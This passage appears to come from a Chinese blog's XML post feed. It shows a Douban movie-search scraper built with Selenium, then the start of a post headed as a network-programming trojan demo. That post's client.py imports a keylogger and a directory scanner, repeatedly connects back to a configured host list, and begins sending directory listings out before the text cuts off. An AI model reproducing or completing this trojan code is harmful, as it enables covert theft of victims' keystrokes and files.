class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    get_html()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>























]]></content>
      <categories>
        <category>嗯哼</category>
      </categories>
      <tags>
        <tag>无聊</tag>
      </tags>
  </entry>
  <entry>
    <title>豆瓣电影搜索</title>
    <url>//%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%E6%90%9C%E7%B4%A2</url>
    <content><![CDATA[<h1 id="豆瓣电影搜索"><a href="#豆瓣电影搜索" class="headerlink" title="豆瓣电影搜索"></a>豆瓣电影搜索</h1><p><a href="http://files.demo443.com/Markdown_file/%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%E6%90%9C%E7%B4%A2.rar" target="_blank">file_rar</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> fake_useragent</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 传入搜索页面中保存的src   url</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jiexi_url</span>(<span class="params">url</span>):</span></span><br><span class="line"></span><br><span class="line">    handers = &#123;</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">    req = requests.get(url, headers=handers)</span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = etree.HTML(req.text)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始解析</span></span><br><span class="line">    text = req.text</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断是否有评分</span></span><br><span class="line">    aa = <span class="string">&#x27;暂无评分&#x27;</span></span><br><span class="line">    pingfen = content.xpath(<span class="string">&#x27;//*[@id=&quot;interest_sectl&quot;]/div/div[2]/div/div[2]/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    leix = re.sub(<span class="string">&#x27;[^\u4e00-\u9fa5]+&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="built_in">str</span>(pingfen))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> aa != leix:</span><br><span class="line">        <span class="comment"># print(text)</span></span><br><span class="line">        <span class="comment"># 正则表达式  需要匹配的格式</span></span><br><span class="line">        geshi_re = <span class="string">&#x27;&quot;@context&quot;: &quot;http://schema.org&quot;,(.*?)&lt;/script&gt;&#x27;</span></span><br><span class="line">        geshi = re.<span class="built_in">compile</span>(geshi_re,re.S)</span><br><span class="line">        js = re.findall(geshi,text)</span><br><span class="line">        join_list = [<span class="string">&#x27;&#123; \n  &quot;@context&quot;:&quot;http://schema.org&quot;,&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 列表拼接</span></span><br><span class="line">        jk = join_list + js</span><br><span class="line">        re_sip = <span class="built_in">str</span>(jk)</span><br><span class="line">        re_1 = re_sip.replace(<span class="string">r&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;&#x27;&#x27;, &#x27;\n  &#x27;&quot;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;&#x27;,&quot;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;   &quot;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;  &quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 转换为json list</span></span><br><span class="line">        json_file = json.loads(re_1)</span><br><span class="line">        <span class="comment"># print(json_file)</span></span><br><span class="line">        <span class="comment"># 剧名</span></span><br><span class="line">        juming = json_file[<span class="number">0</span>][<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;剧名：&#x27;</span>,juming)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 地区</span></span><br><span class="line">        diqu_re = <span class="string">&#x27;&lt;span class=&quot;pl&quot;&gt;制片国家/地区:&lt;/span&gt;(.*?)&lt;span class=&quot;pl&quot;&gt;语言:&lt;/span&gt;&#x27;</span></span><br><span class="line">        diqu_geshi = re.<span class="built_in">compile</span>(diqu_re, re.S)</span><br><span class="line">        json_str = re.findall(diqu_geshi, text)[<span class="number">0</span>]</span><br><span class="line">        diqu = json_str.replace(<span class="string">&#x27;&lt;br/&gt;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">r&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;地区：&#x27;</span>,diqu)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 类型</span></span><br><span class="line">        leixing_re = <span class="string">&#x27;&lt;span class=&quot;pl&quot;&gt;类型:&lt;/span&gt;(.*?)&lt;span class=&quot;pl&quot;&gt;官方网站:&lt;/span&gt;&#x27;</span></span><br><span class="line">        leixing_geshi = re.<span class="built_in">compile</span>(leixing_re, re.S)</span><br><span class="line">        leixs = re.findall(leixing_geshi, text)</span><br><span class="line">        <span class="comment"># 如果类型报错  排除</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> leixs:</span><br><span class="line">            <span class="comment"># 类型</span></span><br><span class="line">            leixing_re = <span class="string">&#x27;&lt;span class=&quot;pl&quot;&gt;类型:&lt;/span&gt;(.*?)&lt;span class=&quot;pl&quot;&gt;制片国家/地区:&lt;/span&gt;&#x27;</span></span><br><span class="line">            leixing_geshi = re.<span class="built_in">compile</span>(leixing_re, re.S)</span><br><span class="line">            leixs = re.findall(leixing_geshi, text)[<span class="number">0</span>]</span><br><span class="line">            leix = re.sub(<span class="string">&#x27;[^\u4e00-\u9fa5]+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, leixs)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;类型：&quot;</span>, leix)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 评分</span></span><br><span class="line">        pingfen = content.xpath(<span class="string">&#x27;//*[@id=&quot;interest_sectl&quot;]/div[1]/div[2]/strong/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;评分：&#x27;</span>, pingfen)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 多少人评价</span></span><br><span class="line">        pingjia = content.xpath(<span class="string">&#x27;//*[@id=&quot;interest_sectl&quot;]/div[1]/div[2]/div/div[2]/a/span/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;多少人评价：&quot;</span>, pingjia)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 导演</span></span><br><span class="line">        daoyan = json_file[<span class="number">0</span>][<span class="string">&#x27;director&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;导演：&#x27;</span>,daoyan)</span><br><span class="line"></span><br><span class="line">        bianju_lists = []</span><br><span class="line">        <span class="comment"># 编剧</span></span><br><span class="line">        bianju_list = json_file[<span class="number">0</span>][<span class="string">&#x27;author&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> bianju_list:</span><br><span class="line">            <span class="keyword">for</span> j,k <span class="keyword">in</span> i.items():</span><br><span class="line">                <span class="keyword">if</span> j == <span class="string">&#x27;name&#x27;</span>:</span><br><span class="line">                    <span class="comment"># print(k)</span></span><br><span class="line">                    bianju_lists.append(k)</span><br><span class="line">        <span class="keyword">del</span> bianju_lists[-<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;编剧：&#x27;</span>,bianju_lists)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 主演</span></span><br><span class="line">        zhuyan_lists = []</span><br><span class="line">        zhuyan_list = json_file[<span class="number">0</span>][<span class="string">&#x27;actor&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> zhuyan_list:</span><br><span class="line">            <span class="keyword">for</span> j,k <span class="keyword">in</span> i.items():</span><br><span class="line">                <span class="keyword">if</span> j == <span class="string">&#x27;name&#x27;</span>:</span><br><span class="line">                    <span class="comment"># print(k)</span></span><br><span class="line">                    zhuyan_lists.append(k)</span><br><span class="line">        <span class="keyword">del</span> zhuyan_lists[-<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;主演：&#x27;</span>,zhuyan_lists)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;该剧  暂无评分!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 正则表达式  需要匹配的格式</span></span><br><span class="line">        geshi_re = <span class="string">&#x27;&quot;@context&quot;: &quot;http://schema.org&quot;,(.*?)&lt;/script&gt;&#x27;</span></span><br><span class="line">        geshi = re.<span class="built_in">compile</span>(geshi_re, re.S)</span><br><span class="line">        js = re.findall(geshi, text)</span><br><span class="line">        join_list = [<span class="string">&#x27;&#123; \n  &quot;@context&quot;:&quot;http://schema.org&quot;,&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 列表拼接</span></span><br><span class="line">        jk = join_list + js</span><br><span class="line">        re_sip = <span class="built_in">str</span>(jk)</span><br><span class="line">        re_1 = re_sip.replace(<span class="string">r&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;&#x27;&#x27;, &#x27;\n  &#x27;&quot;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;&#x27;,&quot;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;   &quot;</span>,</span><br><span class="line">                                                                                                              <span class="string">&#x27;&#x27;</span>).replace(</span><br><span class="line">            <span class="string">&quot;  &quot;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 转换为json list</span></span><br><span class="line">        json_file = json.loads(re_1)</span><br><span class="line">        <span class="comment"># print(json_file)</span></span><br><span class="line">        <span class="comment"># 剧名</span></span><br><span class="line">        juming = json_file[<span class="number">0</span>][<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;剧名：&#x27;</span>, juming)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 地区</span></span><br><span class="line">        diqu_re = <span class="string">&#x27;&lt;span class=&quot;pl&quot;&gt;制片国家/地区:&lt;/span&gt;(.*?)&lt;span class=&quot;pl&quot;&gt;语言:&lt;/span&gt;&#x27;</span></span><br><span class="line">        diqu_geshi = re.<span class="built_in">compile</span>(diqu_re, re.S)</span><br><span class="line">        json_str = re.findall(diqu_geshi, text)[<span class="number">0</span>]</span><br><span class="line">        diqu = json_str.replace(<span class="string">&#x27;&lt;br/&gt;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">r&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;地区：&#x27;</span>, diqu)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 类型</span></span><br><span class="line">        leixing_re = <span class="string">&#x27;&lt;span class=&quot;pl&quot;&gt;类型:&lt;/span&gt;(.*?)&lt;span class=&quot;pl&quot;&gt;官方网站:&lt;/span&gt;&#x27;</span></span><br><span class="line">        leixing_geshi = re.<span class="built_in">compile</span>(leixing_re, re.S)</span><br><span class="line">        leixs = re.findall(leixing_geshi, text)</span><br><span class="line">        <span class="comment"># 如果类型报错  排除</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> leixs:</span><br><span class="line">            <span class="comment"># 类型</span></span><br><span class="line">            leixing_re = <span class="string">&#x27;&lt;span class=&quot;pl&quot;&gt;类型:&lt;/span&gt;(.*?)&lt;span class=&quot;pl&quot;&gt;制片国家/地区:&lt;/span&gt;&#x27;</span></span><br><span class="line">            leixing_geshi = re.<span class="built_in">compile</span>(leixing_re, re.S)</span><br><span class="line">            leixs = re.findall(leixing_geshi, text)[<span class="number">0</span>]</span><br><span class="line">            leix = re.sub(<span class="string">&#x27;[^\u4e00-\u9fa5]+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, leixs)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;类型：&quot;</span>, leix)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 导演</span></span><br><span class="line">        daoyan = json_file[<span class="number">0</span>][<span class="string">&#x27;director&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;导演：&#x27;</span>, daoyan)</span><br><span class="line"></span><br><span class="line">        bianju_lists = []</span><br><span class="line">        <span class="comment"># 编剧</span></span><br><span class="line">        bianju_list = json_file[<span class="number">0</span>][<span class="string">&#x27;author&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> bianju_list:</span><br><span class="line">            <span class="keyword">for</span> j, k <span class="keyword">in</span> i.items():</span><br><span class="line">                <span class="keyword">if</span> j == <span class="string">&#x27;name&#x27;</span>:</span><br><span class="line">                    <span class="comment"># print(k)</span></span><br><span class="line">                    bianju_lists.append(k)</span><br><span class="line">        <span class="keyword">del</span> bianju_lists[-<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;编剧：&#x27;</span>, bianju_lists)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 主演</span></span><br><span class="line">        zhuyan_lists = []</span><br><span class="line">        zhuyan_list = json_file[<span class="number">0</span>][<span class="string">&#x27;actor&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> zhuyan_list:</span><br><span class="line">            <span class="keyword">for</span> j, k <span class="keyword">in</span> i.items():</span><br><span class="line">                <span class="keyword">if</span> j == <span class="string">&#x27;name&#x27;</span>:</span><br><span class="line">                    <span class="comment"># print(k)</span></span><br><span class="line">                    zhuyan_lists.append(k)</span><br><span class="line">        <span class="keyword">del</span> zhuyan_lists[-<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;主演：&#x27;</span>, zhuyan_lists)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_url</span>(<span class="params">base_url, url_list</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 把输入的关键字定义为全局变量</span></span><br><span class="line">        <span class="keyword">global</span> keyword</span><br><span class="line">        keyword = <span class="built_in">input</span>(</span><br><span class="line">            <span class="string">&#x27;Please enter the keyword of the movie. If you want to enter multiple keyword,please seperate them with comma:&#x27;</span>)</span><br><span class="line">        keyword_list = keyword.split(<span class="string">&#x27;,&#x27;</span>)  <span class="comment"># bug  注意区分中文逗号，&amp; 英文逗号,</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">in</span> keyword_list:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;This is the wrong input, please try again:&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> keyword_list:</span><br><span class="line">        url_list.append(base_url.<span class="built_in">format</span>(key))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">NodeExists</span>(<span class="params">xpath</span>):</span></span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">      driver.find_element_by_link_text(xpath)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req_url</span>(<span class="params">url_list, driver,if_xpath</span>):</span></span><br><span class="line">    <span class="comment"># 调用输入的关键字作为文件名</span></span><br><span class="line">    keyword</span><br><span class="line">    filename = <span class="string">&#x27;./&#x27;</span> + keyword + <span class="string">&#x27;电影搜索结果.csv&#x27;</span></span><br><span class="line"></span><br><span class="line">    driver.maximize_window()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="built_in">print</span>(filename, <span class="string">&quot;   文件已创建...&quot;</span>)</span><br><span class="line">        fieldnames = [<span class="string">&quot;电影名&quot;</span>, <span class="string">&quot;链接&quot;</span>]</span><br><span class="line">        f_csv = csv.DictWriter(f, fieldnames=fieldnames)</span><br><span class="line">        f_csv.writeheader()</span><br><span class="line">        b = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> url_list:</span><br><span class="line">            b += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;第 &#123;&#125; 条url: &#x27;</span>.<span class="built_in">format</span>(b),i)</span><br><span class="line">            driver.get(i)</span><br><span class="line">            driver.implicitly_wait(<span class="number">20</span>)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 注入js代码 滑动浏览器滚动条到底</span></span><br><span class="line">            driver.execute_script(<span class="string">&quot;window.scrollTo(0,document.body.scrollHeight)&quot;</span>)</span><br><span class="line"></span><br><span class="line">            text = driver.page_source</span><br><span class="line">            html = etree.HTML(text)</span><br><span class="line">            <span class="comment"># 标识 获取a条数据</span></span><br><span class="line">            a = <span class="number">0</span></span><br><span class="line">            <span class="comment"># 异常抛出 若有分页数据则执行 try中代码  若只有一页数据则执行异常代码</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> NodeExists(if_xpath):</span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                    driver.implicitly_wait(<span class="number">10</span>)</span><br><span class="line">                    text = driver.page_source</span><br><span class="line">                    html = etree.HTML(text)</span><br><span class="line">                    content = html.xpath(<span class="string">&#x27;//*[@id=&quot;root&quot;]/div/div[2]/div[1]/div[1]&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">18</span>):</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            title = content.xpath(<span class="string">&#x27;.//div[&#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27;]/div/div/div[1]/a/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&#x27;title====&#x27;</span>, title)</span><br><span class="line">                            src = content.xpath(<span class="string">&#x27;.//div[&#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27;]/div/div/div[1]/a/@href&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&#x27;src  ====&#x27;</span>, src)</span><br><span class="line">                            a += <span class="number">1</span></span><br><span class="line">                            f_csv.writerow(</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="string">&#x27;电影名&#x27;</span>: title,</span><br><span class="line">                                    <span class="string">&#x27;链接&#x27;</span>: src</span><br><span class="line">                                &#125;</span><br><span class="line">                            )</span><br><span class="line">                            jiexi_url(src)</span><br><span class="line">                        <span class="keyword">except</span>:</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                    <span class="comment"># 点击下一页</span></span><br><span class="line">                    driver.find_element_by_link_text(<span class="string">&#x27;后页&gt;&#x27;</span>).click()</span><br><span class="line">                    driver.implicitly_wait(<span class="number">20</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                content = html.xpath(<span class="string">&#x27;//*[@id=&quot;root&quot;]/div/div[2]/div[1]/div[1]&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">18</span>):</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        title = content.xpath(<span class="string">&#x27;.//div[&#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27;]/div/div/div[1]/a/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                        <span class="comment"># title = html.xpath(&#x27;//*[@id=&quot;root&quot;]/div/div[2]/div[1]/div[1]/div[1]/div/div/div[1]/a/text()&#x27;)[0]</span></span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;title====&#x27;</span>, title)</span><br><span class="line">                        src = content.xpath(<span class="string">&#x27;.//div[&#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27;]/div/div/div[1]/a/@href&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                        <span class="comment"># src = html.xpath(&#x27;//*[@id=&quot;root&quot;]/div/div[2]/div[1]/div[1]/div[1]/div/div/div[1]/a/@href&#x27;)[0]</span></span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;src  ====&#x27;</span>, src)</span><br><span class="line">                        a += <span class="number">1</span></span><br><span class="line">                        f_csv.writerow(</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="string">&#x27;电影名&#x27;</span>: title,</span><br><span class="line">                                <span class="string">&#x27;链接&#x27;</span>: src</span><br><span class="line">                            &#125;</span><br><span class="line">                        )</span><br><span class="line">                        jiexi_url(src)</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># js = &#x27;document.querySelector(&quot;#root &gt; div &gt; div._luoaf7sou &gt; div._zrkqwekox &gt; div:nth-child(1) &gt; div.paginator.sc-htoDjs.eszZtj &gt; a.num.activate.thispage&quot;).click()&#x27;</span></span><br><span class="line">    <span class="comment"># driver.execute_script(js)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;已获取 &#123;&#125; 条数据&#x27;</span>.<span class="built_in">format</span>(a))</span><br><span class="line">    driver.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序结束！！！！！！！！！！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    if_xpath = <span class="string">&#x27;后页&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实例化 user-agent 对象    得到随机user-agent</span></span><br><span class="line">    ua = fake_useragent.UserAgent()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用随机ua</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;user-agent&quot;</span>: ua.random&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 去除浏览器被控  字样</span></span><br><span class="line">    options = webdriver.ChromeOptions()</span><br><span class="line">    options.add_experimental_option(<span class="string">&quot;excludeSwitches&quot;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">    options.add_experimental_option(<span class="string">&#x27;useAutomationExtension&#x27;</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 浏览器扩展程序</span></span><br><span class="line">    <span class="comment"># cookie获取程序</span></span><br><span class="line">    <span class="comment"># extension_path1 = &#x27;./2.1.0.0_0.crx&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># xpath程序</span></span><br><span class="line">    extension_path2 = <span class="string">&#x27;./2.0.2_0.crx&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加扩展程序到浏览器</span></span><br><span class="line">    <span class="comment"># options.add_extension(extension_path1)</span></span><br><span class="line">    options.add_extension(extension_path2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加随机ua到浏览器</span></span><br><span class="line">    options.add_argument(<span class="string">&#x27;user-agent=&#x27;</span> + ua.random)</span><br><span class="line">    driver = webdriver.Chrome(options=options)  <span class="comment"># driver = webdriver.Chrome(executable_path=r&#x27;D:PATHchromedriver.exe&#x27;)?</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 浏览器窗口最大化</span></span><br><span class="line">    <span class="comment"># driver.maximize_window()</span></span><br><span class="line"></span><br><span class="line">    base_url = <span class="string">&#x27;https://search.douban.com/movie/subject_search?search_text=&#123;&#125;&amp;cat=1002&#x27;</span></span><br><span class="line">    url_list = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始执行函数</span></span><br><span class="line">    get_url(base_url, url_list)</span><br><span class="line">    req_url(url_list, driver,if_xpath)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

































]]></content>
      <categories>
        <category>嗯哼</category>
      </categories>
      <tags>
        <tag>无聊</tag>
      </tags>
  </entry>
  <entry>
    <title>已配置_键盘输入获取</title>
    <url>//%E5%B7%B2%E9%85%8D%E7%BD%AE_%E9%94%AE%E7%9B%98%E8%BE%93%E5%85%A5%E8%8E%B7%E5%8F%96</url>
    <content><![CDATA[<h1 id="网络编程-木马-demo"><a href="#网络编程-木马-demo" class="headerlink" title="网络编程_木马__demo"></a>网络编程_木马__demo</h1><h2 id="client-py"><a href="#client-py" class="headerlink" title="client.py"></a>client.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line">sys.path.insert(<span class="number">0</span>,os.path.join(BASE_DIR,<span class="string">&#x27;00网络编程&#x27;</span>))</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> common <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> netapi <span class="keyword">import</span> NetAPI</span><br><span class="line"><span class="keyword">from</span> path <span class="keyword">import</span> scan_dir</span><br><span class="line"><span class="keyword">from</span> keylogger <span class="keyword">import</span> keylogger</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">socket_connect</span>(<span class="params">hostlist, port</span>):</span></span><br><span class="line">    lasthost = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hosts:&#x27;</span>, hostlist)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(hostlist, (<span class="built_in">list</span>, <span class="built_in">tuple</span>)):</span><br><span class="line">            hosts = [lasthost] + <span class="built_in">list</span>(hostlist)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hosts = [lasthost, host]</span><br><span class="line">        <span class="keyword">for</span> host <span class="keyword">in</span> hosts:</span><br><span class="line">            <span class="comment"># print(&#x27;try to connect&#x27;, (host, port))</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">                s.connect((host, port,))</span><br><span class="line">                lasthost = host</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;connect %s:%s successfully&#x27;</span> % (host, <span class="built_in">str</span>(port)))</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="comment"># print(&#x27;Exceptions:&#x27;, e)</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_dir</span>(<span class="params">addr, port, start_dir, visited=&#123;&#125;</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(start_dir, (<span class="built_in">list</span>, <span class="built_in">tuple</span>)):</span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> start_dir:</span><br><span class="line">            visited = send_dir(addr, port, d, visited)</span><br><span class="line">        <span class="keyword">return</span> visited</span><br><span 